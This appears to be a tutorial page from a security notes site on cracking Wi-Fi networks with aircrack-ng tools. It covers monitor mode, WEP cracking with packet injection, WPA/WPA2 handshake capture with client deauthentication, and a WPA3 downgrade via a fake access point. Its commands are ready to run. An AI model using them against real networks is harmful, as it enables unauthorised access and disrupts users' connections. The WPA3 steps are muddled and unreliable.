---
title: Network cracking
layout: page
parent: wifi
---

# Network cracking

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

---

## Setup

### Disclaimer

This is for educational purposes only. Do not use this information for illegal activities. Always get permission before testing any network.

### Monitor mode

First off, you need to set up your wifi interface in monitor mode. To do so, you need to know the name of your wifi interface. You can find it by running the following command:

```bash
ip addr
```

This will list all the network interfaces on your system. Look for the one that corresponds to your wifi adapter. It is usually named `wlan0`, `wlan1`, `wlo1` or something similar.
Once you have identified your wifi interface, you can set it to monitor mode using the following commands :

```bash
sudo airmon-ng check kill
sudo airmon-ng start <interface>
```

### Network scanning

Now, you can scan for wifi networks using the following command:

```bash
sudo airodump-ng <monitor_interface> #eg wlan0mon
```

This will display a list of all the wifi networks in range, and note the BSSID (MAC address) and channel of the target network.

## WEP cracking

### Capture packets

To crack WEP, you need to capture packets from the target network. You can do this using the following command:

```bash
sudo airodump-ng --channel <channel> --bssid <BSSID> --write <output_file> <monitor_interface>
```

You want a lot of Data packets (not just Beacons).

### Speed up the process

To speed up the process, you can use the following command to inject packets into the network:

```bash
sudo aireplay-ng --fakeauth 0 -a <BSSID> <monitor_interface>
```

This will authenticate you to the network and allow you to capture more packets, then you can use the following command to generate ARP requests:

```bash
sudo aireplay-ng --arpreplay -b <BSSID> <monitor_interface>
```

This will generate a lot of traffic and help you capture more packets.

### Cracking the WEP key

Once you have captured enough packets (at least 10000 IVs), you can crack the WEP key using the following command:

```bash
sudo aircrack-ng <output_file>
```

This will attempt to crack the WEP key using the captured packets. If successful, it will display the WEP key in the terminal.

## WPA/WPA2 cracking

### Capture the handshake

To crack WPA/WPA2, you need to capture a 4-way handshake. To do so, you have to capture the handshake when a client connects to the network, so start the airodump-ng command to capture packets:

```bash
sudo airodump-ng --channel <channel> --bssid <BSSID> --write <output_file> <monitor_interface>
```

If a client is connected to the network, you will see the handshake in the terminal. If not, you can use the following command to deauthenticate a client and force it to reconnect in another terminal:

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <STATION> <monitor_interface>
```

### Cracking the WPA/WPA2 key

Once you have captured the handshake, you can crack the WPA/WPA2 key using a wordlist. You can use the following command to crack the key:

```bash
sudo aircrack-ng -w <wordlist> <capture_file>
```

This will attempt to crack the WPA/WPA2 key using the wordlist provided. If successful, it will display the WPA/WPA2 key in the terminal.

## WPA3 downgrade

### Capture packets

To crack WPA3, you need to capture packets from the target network. You can do this using the following command:

```bash
sudo airodump-ng --channel <channel> --bssid <BSSID> --write <output_file> <monitor_interface>
```

### Deauthenticate a client

To deauthenticate a client and force it to reconnect, you can use the following command:

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <STATION> <monitor_interface>
```

### Fake a WPA2 AP

To fake a WPA2 AP, you can use the following command:

```bash
sudo airbase-ng -e <SSID> -c <channel> -P -C 30 -z 10 <monitor_interface>
```

This will create a fake AP with the specified SSID and channel, however, this is not a true WPA2 AP, which can be an issue in some cases.

### Capture the handshake

Conceal the WPA3 handshake by capturing it with airodump-ng:

```bash
sudo airodump-ng --channel <channel> --bssid <fake_BSSID> --write <output_file> <monitor_interface>
```

Once you have captured the handshake, you can crack the WPA3 key using a wordlist. You can use the following command to crack the key:

```bash
sudo aircrack-ng -w <wordlist> <capture_file>
```

This will attempt to crack the WPA3 key using the wordlist provided. If successful, it will display the WPA3 key in the terminal.

## Resetting the interface

Once you are done with the cracking, you can reset your wifi interface to its normal mode using the following command:

```bash
sudo airmon-ng stop <monitor_interface>
```

This will stop the monitor mode and reset the interface to its normal mode.
You can also use the following command to restart the network manager:

```bash
sudo systemctl restart NetworkManager
```

This will restart the network manager and allow you to connect to wifi networks again.
